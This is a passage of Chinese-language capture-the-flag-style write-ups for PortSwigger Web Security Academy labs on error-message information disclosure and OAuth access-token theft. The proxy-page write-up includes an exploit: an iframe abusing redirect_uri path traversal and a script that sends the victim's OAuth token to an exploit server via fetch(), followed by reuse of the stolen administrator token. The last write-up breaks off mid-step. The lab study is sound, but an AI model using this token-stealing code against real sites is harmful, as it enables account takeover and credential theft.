&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-error-messages-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击页面任一商品的&lt;code>View details&lt;/code>，对应请求为
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /product?productId=1
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改&lt;code>productId&lt;/code>参数，获得报错信息
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=x &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">500&lt;/span> &lt;span style="color:#a6e22e">Internal Server Error&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Internal Server Error: java.lang.NumberFormatException: For input string: &amp;#34;x&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Apache Struts 2 2.3.31
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>点击最上方&lt;code>Submit solution&lt;/code>，将&lt;code>Apache Struts 2&lt;/code>版本输入后即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Stealing OAuth access tokens via a proxy page</title><link>/portswigger-posts/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page/</link><pubDate>Sun, 22 Dec 2024 13:33:08 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>登录，并点击&lt;code>Continue&lt;/code>，出现以下Request序列
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=cefvv41oq0lwkcnh9d5ym&amp;amp;redirect_uri=https://0a89006d035badd680d0268d006900e0.web-security-academy.net/oauth-callback&amp;amp;response_type=token&amp;amp;nonce=1926909250&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/oU4KNwQuladMWbXc9VYTn&amp;#34;&amp;gt;/interaction/oU4KNwQuladMWbXc9VYTn&amp;lt;/a&amp;gt;.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /me &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sub&amp;#34;: &amp;#34;wiener&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;apikey&amp;#34;: &amp;#34;m0ucLGYyLJMSBfxUNV7Sgq0Ye9JMnbtL&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;name&amp;#34;: &amp;#34;Peter Wiener&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email&amp;#34;: &amp;#34;wiener@hotdog.com&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email_verified&amp;#34;: true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>重放第一个Request，并修改&lt;code>redirect_uri&lt;/code>，确认参数确实存在目录遍历攻击
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=cefvv41oq0lwkcnh9d5ym&amp;amp;redirect_uri=https://0a89006d035badd680d0268d006900e0.web-security-academy.net/oauth-callback../&amp;amp;response_type=token&amp;amp;nonce=1926909250&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/D_c8k2xC9RZiz4ofxVH4d&amp;#34;&amp;gt;/interaction/D_c8k2xC9RZiz4ofxVH4d&amp;lt;/a&amp;gt;.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到主页，随机点选一篇文章的&lt;code>View post&lt;/code>，可看到有下列Request，从&lt;code>Javascript&lt;/code>代码使用&lt;code>postMessage()&lt;/code>方法将&lt;code>window.location.href&lt;/code>属性发送到其父窗口，通过此特性将&lt;code>redirect_url&lt;/code>和&lt;code>/post/comment/comment-form&lt;/code>请求结合使用
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /post/comment/comment-form &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a89006d035badd680d0268d006900e0.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">parent&lt;/span>.&lt;span style="color:#a6e22e">postMessage&lt;/span>({&lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;onload&amp;#39;&lt;/span>, &lt;span style="color:#a6e22e">data&lt;/span>&lt;span style="color:#f92672">:&lt;/span> window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">href&lt;/span>}, &lt;span style="color:#e6db74">&amp;#39;*&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">submitForm&lt;/span>(&lt;span style="color:#a6e22e">form&lt;/span>, &lt;span style="color:#a6e22e">ev&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ev&lt;/span>.&lt;span style="color:#a6e22e">preventDefault&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">formData&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">FormData&lt;/span>(document.&lt;span style="color:#a6e22e">getElementById&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;comment-form&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">hashParams&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">URLSearchParams&lt;/span>(window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">hash&lt;/span>.&lt;span style="color:#a6e22e">substr&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">formData&lt;/span>.&lt;span style="color:#a6e22e">forEach&lt;/span>((&lt;span style="color:#a6e22e">v&lt;/span>, &lt;span style="color:#a6e22e">k&lt;/span>) =&amp;gt; &lt;span style="color:#a6e22e">o&lt;/span>[&lt;span style="color:#a6e22e">k&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">v&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">hashParams&lt;/span>.&lt;span style="color:#a6e22e">forEach&lt;/span>((&lt;span style="color:#a6e22e">v&lt;/span>, &lt;span style="color:#a6e22e">k&lt;/span>) =&amp;gt; &lt;span style="color:#a6e22e">o&lt;/span>[&lt;span style="color:#a6e22e">k&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">v&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">parent&lt;/span>.&lt;span style="color:#a6e22e">postMessage&lt;/span>({&lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;oncomment&amp;#39;&lt;/span>, &lt;span style="color:#a6e22e">content&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span>}, &lt;span style="color:#e6db74">&amp;#39;*&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">form&lt;/span>.&lt;span style="color:#a6e22e">reset&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">/script&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>，并在Body构造&lt;code>&amp;lt;iframe src=&amp;quot;https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&amp;amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&amp;amp;response_type=token&amp;amp;nonce=-1552239120&amp;amp;scope=openid%20profile%20email&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>，并在其下方新增&lt;code>javascript&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> window.&lt;span style="color:#a6e22e">addEventListener&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;message&amp;#39;&lt;/span>, &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> encodeURIComponent(&lt;span style="color:#a6e22e">e&lt;/span>.&lt;span style="color:#a6e22e">data&lt;/span>.&lt;span style="color:#a6e22e">data&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }, &lt;span style="color:#66d9ef">false&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">/script&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img alt="Exploit bdoy" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-2.jpg">&lt;/li>
&lt;li>点击最下方的&lt;code>Store、Deliver expolit to victim&lt;/code>后点击&lt;code>Access log&lt;/code>
&lt;img alt="Access log" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-3.jpg">&lt;/li>
&lt;li>重放步骤1的第二个Request，并将&lt;code>Authorization: Bearer&lt;/code>参数更换为Admin的&lt;code>access_token&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /me &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authorization&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Bearer &lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sub&amp;#34;: &amp;#34;administrator&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;apikey&amp;#34;: &amp;#34;sN3GREEdlVzIV4u4F34rM6sRzXTkj6J7&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;name&amp;#34;: &amp;#34;Administrator&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email&amp;#34;: &amp;#34;administrator@normal-user.net&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email_verified&amp;#34;: true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到主页，点击最上方的&lt;code>Submit solution&lt;/code>，并输入apikey内容即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Stealing OAuth access tokens via an open redirect</title><link>/portswigger-posts/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect/</link><pubDate>Thu, 19 Dec 2024 21:24:42 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>点击右上角&lt;code>My account&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=gdhf6fwltqrgrrf9024ay&amp;amp;redirect_uri=https://0a7800fc0331631f823f21eb00500072.web-security-academy.net/oauth-callback&amp;amp;response_type=token&amp;amp;nonce=-321443983&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/9vBHInlScXFwj3XcnV1xg&amp;#34;&amp;gt;/interaction/9vBHInlScXFwj3XcnV1xg&amp;lt;/a&amp;gt;.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /interaction/9vBHInlScXFwj3XcnV1xg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>使用&lt;code>wiener:peter&lt;/code>登录，并且点击&lt;code>Continue&lt;/code>，在对应的Response中出现&lt;code>apikey&lt;/code>，且其Request使用&lt;code>Authorization&lt;/code>进行鉴权&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /me &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authorization&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Bearer h1tx7R8XSBLKP6-fOv05F8Zl7mskjzNWtm1TDLg2f7X&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sub&amp;#34;: &amp;#34;wiener&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;apikey&amp;#34;: &amp;#34;VRIUm4vS3kRD5yzDek15MQj6Ypi16A9r&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;name&amp;#34;: &amp;#34;Peter Wiener&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email&amp;#34;: &amp;#34;wiener@hotdog.com&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email_verified&amp;#34;: true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>回放步骤1的&lt;code>/auth&lt;/code>请求，尝试修改&lt;code>redirect_uri&lt;/code>为&lt;code>https://www.google.com&lt;/code>，获得以下错误&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=gdhf6fwltqrgrrf9024ay&amp;amp;redirect_uri=https://www.google.com&amp;amp;response_type=token&amp;amp;nonce=-321443983&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-2.jpg">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>确认&lt;code>redirect_uri&lt;/code>参数确实存在目录遍历攻击，尝试修改&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=gdhf6fwltqrgrrf9024ay&amp;amp;redirect_uri=https://0a7800fc0331631f823f21eb00500072.web-security-academy.net/oauth-callback/../post?postId=1&amp;amp;response_type=token&amp;amp;nonce=-321443983&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
